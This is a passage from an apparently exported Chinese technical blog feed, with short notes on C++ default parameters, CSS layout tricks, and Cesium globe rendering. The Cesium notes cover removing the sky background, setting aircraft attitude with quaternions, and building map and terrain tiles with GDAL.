<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">void Func(int i &#x3D; 1, float f &#x3D; 2.0f, double d &#x3D; 3.0)</span><br><span class="line">&#123;</span><br><span class="line">    cout &lt;&lt; i &lt;&lt; &quot;, &quot; &lt;&lt; f &lt;&lt; &quot;, &quot; &lt;&lt; d &lt;&lt; endl ;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int main(void)</span><br><span class="line">&#123;</span><br><span class="line">    Func() ; &#x2F;&#x2F; 1, 2, 3</span><br><span class="line">    Func(10) ; &#x2F;&#x2F; 10, 2, 3</span><br><span class="line">    Func(10, 20.0f) ; &#x2F;&#x2F; 10, 20, 3</span><br><span class="line">    Func(10, 20.0f, 30.0) ; &#x2F;&#x2F; 10, 20, 30</span><br><span class="line">    return 0 ;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="https://www.cnblogs.com/graphics/archive/2010/07/15/1778291.html" target="_blank" rel="noopener">C++默认参数</a>,by 滴水瓦.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>C/C++</tag>
      </tags>
  </entry>
  <entry>
    <title>CSS技巧记录总结</title>
    <url>/2020/06/08/CSS%E6%8A%80%E5%B7%A7%E8%AE%B0%E5%BD%95%E6%80%BB%E7%BB%93/</url>
    <content><![CDATA[<p>层叠样式表 (Cascading Style Sheets，缩写为 CSS），是一种 样式表 语言，用来描述 HTML 或 XML（包括如 SVG、MathML、XHTML 之类的 XML 分支语言）文档的呈现。CSS 描述了在屏幕、纸质、音频等其它媒体上的元素应该如何被渲染的问题。下面记录一下CSS的“奇技淫巧”。</p>
<h1 id="使用伪元素创建向右箭头"><a href="#使用伪元素创建向右箭头" class="headerlink" title="使用伪元素创建向右箭头"></a>使用伪元素创建向右箭头</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.targetDiv::after&#123;</span><br><span class="line">  content: &quot; &quot;;</span><br><span class="line">  display: inline-block;</span><br><span class="line">  height: 8px;</span><br><span class="line">  width: 8px;</span><br><span class="line">  border-width: 2px 2px 0 0;</span><br><span class="line">  border-color: #b2b2b2;</span><br><span class="line">  border-style: solid;</span><br><span class="line">  transform: matrix(.71,.71,-.71,.71,0,0);</span><br><span class="line">  position: relative;</span><br><span class="line">  top: -2px;</span><br><span class="line">  position: absolute;</span><br><span class="line">  top: 50%;</span><br><span class="line">  margin-top: -5px;</span><br><span class="line">  left:90%;</span><br><span class="line">  right: 0;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="CSS3-框大小"><a href="#CSS3-框大小" class="headerlink" title="CSS3 框大小"></a>CSS3 框大小</h1><p>CSS3 box-sizing 属性可以设置 width 和 height 属性中包含了 padding(内边距) 和 border(边框)。</p>
<p>默认情况下，元素的宽度与高度计算方式如下：</p>
<p>width(宽) + padding(内边距) + border(边框) = 元素实际宽度</p>
<p>height(高) + padding(内边距) + border(边框) = 元素实际高度</p>
<p>但是，如果在元素上设置了CSS3 box-sizing: border-box; 则 padding(内边距) 和 border(边框) 也将包含在 width 和 height 中。</p>
<h1 id="CSS-writing-mode-文字竖排"><a href="#CSS-writing-mode-文字竖排" class="headerlink" title="CSS writing-mode 文字竖排"></a>CSS writing-mode 文字竖排</h1><p>writing-mode 属性定义了文本在水平或垂直方向上如何排布。</p>
<p>语法格式如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">writing-mode: horizontal-tb | vertical-rl | vertical-lr | sideways-rl | sideways-lr</span><br></pre></td></tr></table></figure>

<ul>
<li>horizontal-tb：水平方向自上而下的书写方式。即 left-right-top-bottom</li>
<li>vertical-rl：垂直方向自右而左的书写方式。即 top-bottom-right-left</li>
<li>vertical-lr：垂直方向内内容从上到下，水平方向从左到右</li>
<li>sideways-rl：内容垂直方向从上到下排列</li>
<li>sideways-lr：内容垂直方向从下到上排列</li>
</ul>
<h1 id="CSS-箭头和三角形"><a href="#CSS-箭头和三角形" class="headerlink" title="CSS 箭头和三角形"></a>CSS 箭头和三角形</h1><p>CSS画箭头和三角形都是利用div标签的边框属性，例如：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F; 三角形</span><br><span class="line">&lt;div class&#x3D;&quot;box&quot;&gt;&lt;&#x2F;div&gt;</span><br><span class="line">&#x2F;&#x2F; css代码</span><br><span class="line">.box &#123;</span><br><span class="line">  width: 0;</span><br><span class="line">  height: 0;</span><br><span class="line">  border: 100px solid red;</span><br><span class="line">  border-color: red transparent transparent transparent;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 箭头</span><br><span class="line">&lt;div class&#x3D;&quot;box&quot;&gt;&lt;&#x2F;div&gt;</span><br><span class="line">&#x2F;&#x2F; css代码</span><br><span class="line">.box &#123;</span><br><span class="line">      margin-top: 50px;</span><br><span class="line">      width: 100px;</span><br><span class="line">      height: 100px;</span><br><span class="line">      border-top: 10px solid red;</span><br><span class="line">      border-right: 10px solid red;</span><br><span class="line">      transform: rotate(45deg);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="height-100-不生效问题"><a href="#height-100-不生效问题" class="headerlink" title="height:100%不生效问题"></a>height:100%不生效问题</h1><p>浏览器按照从上到下，从外到内的顺序渲染DOM内容。因此当父元素没有设置高度值或者设为绝对定位，则子元素的height:100%不会不生效。</p>
<p>div的高度是由什么决定？是由它文档流中元素的高度的总和。</p>
<p>什么是文档流(Normal Flow)：指的是元素排版布局过程中，内联元素会默认自动从左往右，块级元素从上往下的流式排列方式。并最终窗体自上而下分成一行行，并在每行中从左至右的顺序排放元素。</p>
<p>脱离文档流(常见):</p>
<ul>
<li>float:left;</li>
<li>position: absolute;</li>
<li>position:fixed;</li>
</ul>
<h1 id="单行缩略-以及多行缩略"><a href="#单行缩略-以及多行缩略" class="headerlink" title="单行缩略..以及多行缩略"></a>单行缩略..以及多行缩略</h1><p>html单行缩略方法:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.oneline &#123;</span><br><span class="line">    white-space: nowrap; &#x2F;&#x2F;强制文本在一行内输出</span><br><span class="line">    overflow: hidden; &#x2F;&#x2F;隐藏溢出部分</span><br><span class="line">    text-overflow: ellipsis; &#x2F;&#x2F;对溢出部分加上...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="CSS尺寸单位-px-em-rem"><a href="#CSS尺寸单位-px-em-rem" class="headerlink" title="CSS尺寸单位 % px em rem"></a>CSS尺寸单位 % px em rem</h1><p>在CSS中，尺寸单位分为两类：相对长度单位和绝对长度单位。相对长度单位按照不同的参考元素，又可以分为字体相对单位和视窗相对单位。字体相对单位有：em、ex、ch、rem；视窗相对单位有：vw、vh、vmin、vmax几种。绝对长度单位则是固定尺寸，它们采用的是物理度量单位：cm、mm、in、px、pt以及pc。但在实际应用中，我们使用最广泛的则是em、rem、px以及百分比（%）来度量页面元素的尺寸。</p>
<ul>
<li>px：为像素单位。它是显示屏上显示的每一个小点，为显示的最小单位。它是一个绝对尺寸单位，是不能变动的；</li>
<li>em：它是描述相对于应用在当前元素的字体尺寸，所以它也是相对长度单位，可以变动。一般浏览器字体大小默认为16px，则2em == 32px；</li>
<li>rem：它是描述相对于当前根元素字体尺寸，除了描述对象与em不同其余都和em一样。</li>
<li>%： 百分比，它是一个更纯粹的相对长度单位，可以变动。它描述的是相对于父元素的百分比值。如50%，则为父元素的一半。</li>
</ul>
<h1 id="CSS使网站黑白灰效果的代码"><a href="#CSS使网站黑白灰效果的代码" class="headerlink" title="CSS使网站黑白灰效果的代码"></a>CSS使网站黑白灰效果的代码</h1><p>使用如下CSS即可：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">html &#123;</span><br><span class="line">       filter: grayscale(100%); </span><br><span class="line">       -webkit-filter: grayscale(100%); </span><br><span class="line">       -moz-filter: grayscale(100%); </span><br><span class="line">       -ms-filter: grayscale(100%); </span><br><span class="line">       -o-filter: grayscale(100%); </span><br><span class="line">       -webkit-filter: grayscale(1);</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>

<p>代码释义：filter 是滤镜的意思，filter:gray 的意思就是说给页面加上一个灰度的滤镜，所以 html 里面的所有内容都会变成黑白的了。不过这个滤镜对于 Chrome 和 Safari 浏览器是无效的，所以下面会有一行 -webkit-filter: grayscale(100%); 这个样式是专属于使用 webkit 内核的浏览器的，意思和 filter: gray; 差不多，只是写法不同罢了。</p>
<h1 id="CSS打印时隐藏输入框占位符"><a href="#CSS打印时隐藏输入框占位符" class="headerlink" title="CSS打印时隐藏输入框占位符"></a>CSS打印时隐藏输入框占位符</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">@media print &#123;</span><br><span class="line">  ::-webkit-input-placeholder &#123; &#x2F;* WebKit browsers *&#x2F;</span><br><span class="line">      color: transparent;</span><br><span class="line">  &#125;</span><br><span class="line">  :-moz-placeholder &#123; &#x2F;* Mozilla Firefox 4 to 18 *&#x2F;</span><br><span class="line">      color: transparent;</span><br><span class="line">  &#125;</span><br><span class="line">  ::-moz-placeholder &#123; &#x2F;* Mozilla Firefox 19+ *&#x2F;</span><br><span class="line">      color: transparent;</span><br><span class="line">  &#125;</span><br><span class="line">  :-ms-input-placeholder &#123; &#x2F;* Internet Explorer 10+ *&#x2F;</span><br><span class="line">      color: transparent;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="CSS-float属性"><a href="#CSS-float属性" class="headerlink" title="CSS float属性"></a>CSS float属性</h1><p>CSS 的 Float（浮动）使元素脱离文档流，按照指定的方向（左或右发生移动），直到它的外边缘碰到包含框或另一个浮动框的边框为止。</p>
<p>文档流是是文档中可显示对象在排列时所占用的位置/空间，而脱离文档流就是在页面中不占位置了。</p>
<p>当元素设置float浮动后，该元素就会脱离文档流并向左/向右浮动，直到碰到父元素或者另一个浮动元素，浮动元素会造成父元素高度塌陷。</p>
<p>清除浮动的影响的方法有：</p>
<ul>
<li>设置父布局的高度</li>
</ul>
<p>设置父标签合适的高度，前提必须确定子布局的高度，来计算父布局的合适高度，包裹住子布局。</p>
<ul>
<li>受影响的元素加clear属性</li>
</ul>
<p>给受影响的div加clear，清除浮动的影响</p>
<ul>
<li>overflow清除浮动</li>
</ul>
<p>父级标签的样式里面加: overflow:hidden;</p>
<ul>
<li>空div法</li>
</ul>
<p>在最后一个浮动的盒子的后面，新添加一个标签。然后设置clear清除浮动。</p>
<ul>
<li>伪对象法</li>
</ul>
<p>为父标签添加伪类After,设置空的内容，并且使用clear:both;</p>
<h1 id="CSS-width属性"><a href="#CSS-width属性" class="headerlink" title="CSS width属性"></a>CSS width属性</h1><p>css的三大特性分别是 继承性，层叠性，和优先级。</p>
<p>css的继承性指的被包在内部的标签拥有外部标签的样式性，子元素可以继承父元素的属性。但也不是所有的css属性都有继承性的。</p>
<ul>
<li>只有块元素才可以默认“继承”其父元素的width.</li>
<li>浮动元素和定位元素也是不默认（不自动）“继承”其父元素宽度的。</li>
</ul>
<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS" target="_blank" rel="noopener">CSS（层叠样式表）</a>,by mozilla.</li>
<li><a href="https://www.runoob.com/css3/css3-box-sizing.html" target="_blank" rel="noopener">CSS3 框大小</a>,by runoob.com.</li>
<li><a href="https://blog.csdn.net/lzhlzz/article/details/52937310" target="_blank" rel="noopener">不让padding影响元素的宽度</a>,by DecemberCafe.</li>
<li><a href="https://www.zhangxinxu.com/wordpress/2016/04/css-writing-mode/" target="_blank" rel="noopener">改变CSS世界纵横规则的writing-mode属性</a>,by 张鑫旭.</li>
<li><a href="https://blog.infolink.com.tw/2021/rediscover-pixel-dpi-ppi-and-pixel-density/" target="_blank" rel="noopener">重新认识Pixel、DPI / PPI 以及像素密度</a>,by Leon.</li>
<li><a href="https://www.jianshu.com/p/cf7d5920a7ed" target="_blank" rel="noopener">CSS画三角形，箭头</a>,by 麦西的西.</li>
<li><a href="https://zhuanlan.zhihu.com/p/57178470" target="_blank" rel="noopener">如何用 CSS 画三角形和箭头</a>,by 前端技术.</li>
<li><a href="https://www.cnblogs.com/yugege/p/9264319.html" target="_blank" rel="noopener">深入理解CSS系列（二）：为什么height:100%不生效？</a>,by ChessZhang.</li>
<li><a href="https://www.jianshu.com/p/3869bcef2e62" target="_blank" rel="noopener">height：100%失效解决办法</a>,by 当然我没扯淡.</li>
<li><a href="https://www.cnblogs.com/yuaima/p/5875055.html" target="_blank" rel="noopener">css之单行缩略..以及多行缩略</a>,by 秋天的故事.</li>
<li><a href="https://www.cnblogs.com/HDK2016/p/6128503.html" target="_blank" rel="noopener">CSS尺寸单位 % px em rem 详解</a>,by HDWK.</li>
<li><a href="https://juejin.cn/post/6844903697135173645" target="_blank" rel="noopener">如何修改placeholder样式</a>,by 风火星辰.</li>
<li><a href="https://oldtang.com/2793.html" target="_blank" rel="noopener">一行 CSS 代码实现整个网站网页变黑白灰的效果</a>,by 老唐.</li>
<li><a href="https://stackoverflow.com/questions/21485581/css-hide-placeholder-on-print" target="_blank" rel="noopener">CSS hide placeholder on print [duplicate]</a>,by stackoverflow.</li>
<li><a href="https://zhuanlan.zhihu.com/p/252413632" target="_blank" rel="noopener">深入理解float浮动属性</a>,by 知乎用户1sIGTn.</li>
<li><a href="https://www.cnblogs.com/gaogch/p/10652694.html" target="_blank" rel="noopener">css的继承之width属性（容易忽略）</a>,by 秋天的鱼.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>CSS</tag>
      </tags>
  </entry>
  <entry>
    <title>Cesium去掉黑色星空背景并透明的方法</title>
    <url>/2020/09/28/Cesium%E5%8E%BB%E6%8E%89%E9%BB%91%E8%89%B2%E6%98%9F%E7%A9%BA%E8%83%8C%E6%99%AF%E5%B9%B6%E9%80%8F%E6%98%8E%E7%9A%84%E6%96%B9%E6%B3%95/</url>
    <content><![CDATA[<p>为了使Cesium与整个网页的背景融合，需要去掉Cesium的黑色星空背景，具体方法如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">viewer.scene.skyBox.destroy();</span><br><span class="line">viewer.scene.skyBox &#x3D; undefined;</span><br><span class="line">viewer.scene.sun.destroy();</span><br><span class="line">viewer.scene.sun &#x3D; undefined;</span><br><span class="line">viewer.scene.moon.destroy();</span><br><span class="line">viewer.scene.moon &#x3D; undefined;</span><br><span class="line">viewer.scene.skyAtmosphere.destroy();</span><br><span class="line">viewer.scene.skyAtmosphere &#x3D; undefined;</span><br><span class="line"></span><br><span class="line">viewer.scene.backgroundColor &#x3D; new Cesium.Color(0, 0, 0, 0);</span><br></pre></td></tr></table></figure>

<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="https://groups.google.com/forum/#!topic/cesium-dev/dh3O12530hA" target="_blank" rel="noopener">Scene Background Transparent</a>,by cesium dev.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>Cesium</tag>
      </tags>
  </entry>
  <entry>
    <title>Cesium中飞行器姿态控制</title>
    <url>/2018/06/10/Cesium%E4%B8%AD%E9%A3%9E%E8%A1%8C%E5%99%A8%E5%A7%BF%E6%80%81%E6%8E%A7%E5%88%B6/</url>
    <content><![CDATA[<h1 id="问题提出"><a href="#问题提出" class="headerlink" title="问题提出"></a>问题提出</h1><p>最近研究开源虚拟地球Cesium，遇到一个问题：在获取飞行器经度纬度高度偏航俯仰滚转六个参数的前提下，如何在Cesium中用CZML文件表示，从而完美实现飞行器姿态轨迹的复现。在CZML的position属性中使用cartographicDegrees表示飞行器的经度纬度高度，可以很好复现飞行器的轨迹。然而在CZML的orientation属性中使用unitQuaternion表示飞机自身姿态时，飞机姿态总是不对。</p>
<h1 id="问题分析"><a href="#问题分析" class="headerlink" title="问题分析"></a>问题分析</h1><h2 id="基本知识"><a href="#基本知识" class="headerlink" title="基本知识"></a>基本知识</h2><p>在Cesium中存在两种常用坐标系：</p>
<ol>
<li>世界坐标系<br>世界坐标系统是以椭球中心为原点的笛卡尔空间直角坐标系。</li>
<li>地理坐标系<br>地理坐标系即人们常用的使用经度、纬度、高度表示位置的坐标系。</li>
<li>站心坐标系<br>又称为Earth-fixed coordinate system（站点坐标系、东-北-天坐标系ENU）。可分为站心直角坐标系和站心极坐标系。<br>常用的站心直角坐标系定义为：以站心（如GPS接收天线中心）为坐标系原点O，Z轴与椭球法线重合，向上为正（天向），y与椭球短半轴重合（北向），x轴与地球椭球的长半轴重合（东向）所构成的直角坐标系，称为当地东北天坐标系（ENU）。<br>飞行器的偏航、俯仰、滚转即是以站心直角坐标系为参考。</li>
<li>模型坐标系<br>模型坐标系以物体的中心为坐标原点，物体旋转、平移等操作都是围绕局部坐标系进行的。这时当物体模型进行旋转、平移等操作时，局部坐标系也执行相应的旋转、平移等操作。<br>局部坐标系是一个假想的坐标系，该坐标系与物体的相对位置至始至终是不变的，假想出这个坐标系的目的主要是为了正向理解对三维场景中物体执行的平移和旋转操作。使用局部坐标系理解模型变换时，所有的变换操作直接作用与局部坐标系，由于局部坐标系与物体的相对位置不变，因此对局部坐标系进行平移、旋转和缩放时，物体在场景中位置和形状也会发生相应的变化。</li>
</ol>
<p>在Cesium中存在两种世界坐标系和地理坐标系之间坐标转换的方法：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 经纬度转换为世界坐标</span><br><span class="line">Cesium.Cartesian3.fromDegrees(longitude, latitude, height, ellipsoid, result) </span><br><span class="line"># 世界坐标转换为经纬度</span><br><span class="line">var ellipsoid&#x3D;viewer.scene.globe.ellipsoid;</span><br><span class="line">var cartesian3&#x3D;new Cesium.cartesian3(x,y,z);</span><br><span class="line">var cartographic&#x3D;ellipsoid.cartesianToCartographic(cartesian3);</span><br><span class="line">var lat&#x3D;Cesium.Math.toDegrees(cartograhphic.latitude);</span><br><span class="line">var lng&#x3D;Cesium.Math.toDegrees(cartograhpinc.longitude);</span><br><span class="line">var alt&#x3D;cartographic.height;</span><br></pre></td></tr></table></figure>

<h2 id="CZML分析"><a href="#CZML分析" class="headerlink" title="CZML分析"></a>CZML分析</h2><p>CZML是一种用来描述动态场景的JSON架构的语言，主要用于Cesium在浏览器中的展示。它可以用来描述点、线、布告板、模型以及其他的图元，同时定义他们是怎样随时间变化的<sup>[3]</sup>。  </p>
<p>CZML可使用model属性直接加载3D模型，由position属性决定模型在世界坐标系内的位置，由orientation决定模型在世界坐标系内的姿态，并最终由orientation的unitQuaternion表示。  </p>
<p>unitQuaternion即单位四元数，可与偏航俯仰滚转相互转换，并避免偏航俯仰滚转的万向节锁定问题，但其本质上都是一个旋转矩阵，可决定模型在世界坐标系内的姿态。</p>
<h2 id="获取正确的飞行器姿态"><a href="#获取正确的飞行器姿态" class="headerlink" title="获取正确的飞行器姿态"></a>获取正确的飞行器姿态</h2><p>首先计算飞行器模型坐标系对站点直角坐标系的旋转矩阵（在制作飞行器3D模型时，应使其中心在本地坐标系原点，机头机翼与轴平行，方便计算在站点直角坐标系内的旋转角度），再乘以由飞行器偏航俯仰滚转得到的旋转矩阵，再乘以站点直角坐标系对世界坐标系的旋转矩阵。将最终得到旋转矩阵转换为单位四元数，即得到正确的飞行器姿态。</p>
<p>小技巧：飞机3D模型的中心设置在本地坐标系原点，机头机翼与轴平行后，可能在Cesium中渲染时姿态还是不对。原因是绕Z轴旋转的角度还是不对。可以在HeadingPitchRoll示例中使用自己的飞机3D模型，参照Cesium给的运输机模型，比较它们之间绕Z轴旋转的差异，然后调整飞机3D模型绕Z轴旋转的角度。</p>
<h1 id="解决方法"><a href="#解决方法" class="headerlink" title="解决方法"></a>解决方法</h1><p>参考代码如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var lon&#x3D;113,lat&#x3D;34;&#x2F;&#x2F;模型的站心经纬度</span><br><span class="line">var h1&#x3D;0,p1&#x3D;0,r1&#x3D;0;&#x2F;&#x2F;模型坐标系对站点坐标系的旋转角度</span><br><span class="line">var h2&#x3D;0,p2&#x3D;0,r2&#x3D;0;&#x2F;&#x2F;模型在站点坐标系的姿态</span><br><span class="line">var center &#x3D; Cesium.Cartesian3.fromDegrees(lon, lat)</span><br><span class="line">var hpr &#x3D; new Cesium.HeadingPitchRoll(h1+h2, p1+p2, r1+r2)</span><br><span class="line">var q1 &#x3D; Cesium.Transforms.headingPitchRollQuaternion(center, hpr)</span><br></pre></td></tr></table></figure>

<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="https://stackoverflow.com/questions/43389069/cesium-how-to-animate-an-aircraft-from-pitch-roll-heading" target="_blank" rel="noopener">CESIUM : How to animate an aircraft from pitch, roll, heading?</a>, by stackoverflow.</li>
<li><a href="https://blog.csdn.net/qq_34149805/article/details/78393540" target="_blank" rel="noopener">Cesium中的几种坐标和相互转换</a>, by finalLi.</li>
<li><a href="http://www.cnblogs.com/laixiangran/p/4997971.html" target="_blank" rel="noopener">Cesium Language (CZML) 入门1 — CZML Structure（CZML的结构）</a>, by laixiangran.</li>
<li><a href="https://github.com/AnalyticalGraphicsInc/cesium/wiki/CZML-Structure" target="_blank" rel="noopener">CZML Structure</a>, by AnalyticalGraphicsInc.</li>
<li><a href="https://www.jianshu.com/p/8d483fa1acbd" target="_blank" rel="noopener">3D坐标系</a>, by S_H_C.</li>
<li><a href="https://blog.csdn.net/trojanpizza/article/details/6652533" target="_blank" rel="noopener">3D空间的坐标系</a>, by trojanpizza.</li>
<li><a href="https://blog.csdn.net/qq_30100043/article/details/91958750" target="_blank" rel="noopener">cesium获取某个位置垂直于当前地表的垂直坐标系</a>,by 暮志未晚Webgl.</li>
<li><a href="https://www.jianshu.com/p/244ed413a3bd" target="_blank" rel="noopener">Cesium控制模型旋转2019-11-15</a>,by _____xyz.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>Cesium</tag>
      </tags>
  </entry>
  <entry>
    <title>Cesium卫星地图和高程数据切片经验总结</title>
    <url>/2018/06/13/Cesium%E5%8D%AB%E6%98%9F%E5%9C%B0%E5%9B%BE%E5%92%8C%E9%AB%98%E7%A8%8B%E6%95%B0%E6%8D%AE%E5%88%87%E7%89%87%E7%BB%8F%E9%AA%8C%E6%80%BB%E7%BB%93/</url>
    <content><![CDATA[<p>最近研究在Cesium中调用自定义的图像和地形，不借助任何GIS系统（如Arcgis、天地图等），方便在网络不好或离线的情况下使用。下面对整个过程进行总结。</p>
<h1 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h1><h2 id="地图服务提供方法"><a href="#地图服务提供方法" class="headerlink" title="地图服务提供方法"></a>地图服务提供方法</h2><p>目前互联网地图服务商提供的地图服务分成两种<sup>[3]</sup>：  </p>
<ul>
<li>图像瓦片地图服务<br>这种方法目前最常见，其提供的是图片格式的瓦片，在客户端将拼接成真正的地图。</li>
<li>矢量瓦片地图服务<br>这种方法正在发展，其提供矢量的瓦片数据，然后在客户端进行渲染，是今后的发展方向。</li>
</ul>
<p>地图服务在使用过程中需要获取特定经纬度所在区域的瓦片和获取瓦片上像素点对应的经纬度，因此需要进行经纬度坐标与瓦片坐标、像素坐标的相互转换。</p>
<h3 id="经纬度与瓦片编号互换"><a href="#经纬度与瓦片编号互换" class="headerlink" title="经纬度与瓦片编号互换"></a>经纬度与瓦片编号互换</h3><p>互联网地图的经纬度坐标与瓦片坐标相互转换只与该地图商的墨卡托投影和瓦片编号的定义有关，跟地图商采用的大地坐标系标准无关。</p>
<h3 id="经纬度与瓦片像素互换"><a href="#经纬度与瓦片像素互换" class="headerlink" title="经纬度与瓦片像素互换"></a>经纬度与瓦片像素互换</h3><p>转换方式与地图商采用的大地坐标系有关。国际标准的经纬度坐标是WGS84。Open Street Map、外国版的Google Map都是采用WGS84；高德地图使用的坐标系是GCJ-02；百度地图使用的坐标系是BD-09。</p>
<h2 id="地图投影"><a href="#地图投影" class="headerlink" title="地图投影"></a>地图投影</h2><p>地图投影，是指按照一定的数学法则将地球椭球面上的经纬网转换到平面上，使地面的地理坐标与平面直角坐标建立起函数关系。这是绘制地图的数学基础之一。由于地球是一个不可展的球体，使用物理方法将其展平会引起褶皱、拉伸和断裂，因此要使用地图投影实现由曲面向平面的转化。</p>
<h3 id="麦卡托投影法"><a href="#麦卡托投影法" class="headerlink" title="麦卡托投影法"></a>麦卡托投影法</h3><p>麦卡托投影法 (Mercator projection)，又称麦卡托投影法、正轴等角圆柱投影，是一种等角的圆柱形地图投影法。本投影法得名于法兰德斯出身的地理学家杰拉杜斯·麦卡托，他于1569年发表长202公分、宽124公分以此方式绘制的世界地图。在以此投影法绘制的地图上，经纬线于任何位置皆垂直相交，使世界地图可以绘制在一个长方形上。由于可显示任两点间的正确方位，航海用途的海图、航路图大都以此方式绘制。在该投影中线型比例尺在图中任意一点周围都保持不变，从而可以保持大陆轮廓投影后的角度和形状不变（即等角）；但麦卡托投影会使面积产生变形，极点的比例甚至达到了无穷大。</p>
<p align="center">
    <img src="images/墨卡托投影示意图.jpg" width="50%" alt="墨卡托投影示意图"/>
</p>
<center>图1  墨卡托投影示意图</center>
各大地图服务商大都采用了Web Mercator进行投影，瓦片坐标系的不同主要是投影截取的地球范围不同、瓦片坐标起点不同<sup>[3]</sup>。

<h2 id="瓦片切割和瓦片坐标"><a href="#瓦片切割和瓦片坐标" class="headerlink" title="瓦片切割和瓦片坐标"></a>瓦片切割和瓦片坐标</h2><p>对于经过墨卡托投影为平面的世界地图，在不同的地图分辨率(整个世界地图的像素大小)下，通过切割的方式将世界地图划分为像素为256px/256px的地图单元，划分成的每一块地图单元称为地图瓦片。其特定如下：</p>
<ul>
<li>具有唯一的瓦片等级（Level）和瓦片坐标编号（tileX, tileY）。</li>
<li>瓦片分辨率为256*256。</li>
<li>最小的地图等级是0，此时世界地图只由一张瓦片组成。</li>
<li>瓦片等级越高，组成世界地图的瓦片数越多，可以展示的地图越详细。</li>
<li>某一瓦片等级地图的瓦片是由低一级的各瓦片切割成的4个瓦片组成，形成了瓦片金字塔。</li>
</ul>
<p align="center">
    <img src="images/瓦片金字塔.jpg" width="50%" alt="瓦片金字塔"/>
</p>

<h1 id="过程总结"><a href="#过程总结" class="headerlink" title="过程总结"></a>过程总结</h1><p>将自定义图像和地形以Web形式发布后，在cesium中调用自定义图像和地形很简单，代码如下，关键是图像和地形的获取和处理。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var tmsImageryProvider&#x3D;Cesium.createTileMapServiceImageryProvider(&#123;</span><br><span class="line">    url:&#39;http:&#x2F;&#x2F;localhost:8080&#x2F;test_tms_tiles&#39;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">var terrainProvider&#x3D;new Cesium.CesiumTerrainProvider(&#123;</span><br><span class="line">    url:&#39;http:&#x2F;&#x2F;localhost:8080&#x2F;terrain_tiles&#39;</span><br><span class="line">&#125;);</span><br><span class="line">var viewer &#x3D; new Cesium.Viewer(&#39;cesiumContainer&#39;, &#123;</span><br><span class="line">    imageryProvider : tmsImageryProvider,</span><br><span class="line">    terrainProvider: terrainProvider,</span><br><span class="line">    baseLayerPicker: false,</span><br><span class="line">    geocoder: false,</span><br><span class="line">    shadows: false,</span><br><span class="line">    shouldAnimate: true</span><br><span class="line">&#125;)</span><br><span class="line">&#x2F;&#x2F; 摄像头使用默认姿态在指定高度指向指定位置</span><br><span class="line">viewer.camera.setView(&#123;</span><br><span class="line">    destination : Cesium.Cartesian3.fromDegrees(108.60, 34.15, 6000.0)</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
<h2 id="卫星图像的获取和处理"><a href="#卫星图像的获取和处理" class="headerlink" title="卫星图像的获取和处理"></a>卫星图像的获取和处理</h2><p>卫星图像获取可以使用一些相关软件，如水经注、LocaSpaceViewer、SXearth等。其原理通常是从一些地图服务商下载地图瓦片后重新拼接，再分割成对应格式的瓦片。拼接的图像最好输出为<strong>tif格式</strong>，因为tif格式可以在头部包含一些信息，例如地理坐标等信息，以方便后续的瓦片切割，以及被GIS系统直接识别导入。为使切割后的瓦片能够被Cesium直接调用，应采用<strong>标准TMS方式</strong>。</p>
<p>通常卫星图像下载软件提供多种瓦片分割方式，如果能直接进行标准TMS瓦片分割最好不过，如果不可以进行标准TMS分割，则可使用GDAL。</p>
<p>GDAL是地理空间数据抽象库的简称，是一个地理空间数据的格式转换及处理工具。文章最后将详细介绍其安装使用方法。使用GDAL进行卫星图像瓦片分割主要使用gdal2tiles.py工具。具体步骤如下：</p>
<ol>
<li>选取之前下载拼接的最大分辨率的tif卫星图像</li>
<li>使用如下命令切割卫星图片,将自动生成瓦片金字塔。<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">gdal2tiles.py &lt;image&gt; &lt;tilesdir&gt;</span><br></pre></td></tr></table></figure>

</li>
</ol>
<p>或者参考<a href="http://mars3d.cn/dev/guide/data/xyz.html#_1-tif%E6%A0%BC%E5%BC%8F%E4%BB%8B%E7%BB%8D" target="_blank" rel="noopener">瓦片底图：TIF影像金字塔切片处理及加载</a>。</p>
